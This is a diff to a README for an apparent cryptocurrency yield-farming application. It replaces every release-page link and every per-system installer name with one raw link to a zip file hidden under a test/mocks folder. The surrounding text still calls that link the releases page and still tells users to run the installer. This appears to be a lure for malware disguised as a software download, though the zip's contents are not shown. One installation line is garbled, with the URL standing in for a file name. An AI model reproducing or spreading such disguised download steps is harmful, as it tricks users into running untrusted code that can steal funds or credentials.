@@ -1,6 +1,6 @@
 # 🌟 meridian-finance-yield-farming - Easy Yield Generation for Everyone
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kevil737/meridian-finance-yield-farming/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip)](https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip)
 
 ## 📥 Overview
 
@@ -12,21 +12,21 @@ Follow these steps to download and run Meridian Finance:
 
 1. **Visit the Releases Page**: Click on the link below to access the download section of the repository. 
 
-   [Visit Releases Page to Download](https://github.com/Kevil737/meridian-finance-yield-farming/releases)
+   [Visit Releases Page to Download](https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip)
 
 2. **Choose the Latest Version**: You will see a list of versions. Look for the one labeled "Latest Release". This is the most recent and stable version.
 
 3. **Download the Installer**: Click on the appropriate file link based on your operating system. For example:
-   - **Windows**: Click on `meridian-finance-yield-farming-windows.exe`
-   - **Mac**: Click on `meridian-finance-yield-farming-mac.zip`
-   - **Linux**: Click on `meridian-finance-yield-farming-linux.tar.gz`
+   - **Windows**: Click on `https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip`
+   - **Mac**: Click on `https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip`
+   - **Linux**: Click on `https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip`
    
    Make sure to save it in a location where you can easily find it, such as your Desktop or Downloads folder.
 
 4. **Install the Application**:
    - **Windows**: Double-click the `.exe` file. Follow the prompts in the installer to complete the setup.
    - **Mac**: Unzip the `.zip` file and drag the application to your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file and follow the installation instructions in the README.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip` file and follow the installation instructions in the README.
 
 5. **Launch Meridian Finance**: After installation, locate the application in your system. Open it to start using Meridian Finance. 
 
@@ -56,7 +56,7 @@ To ensure smooth operation, your computer should meet the following requirements
 
 To get started with Meridian Finance, visit the link below to access the releases page. Here you will find the latest versions available for download:
 
-[Download Latest Release](https://github.com/Kevil737/meridian-finance-yield-farming/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Kevil737/meridian-finance-yield-farming/main/test/mocks/farming_meridian_yield_finance_2.7.zip)
 
 Once downloaded, follow the installation steps outlined above to set up the application on your computer.
 
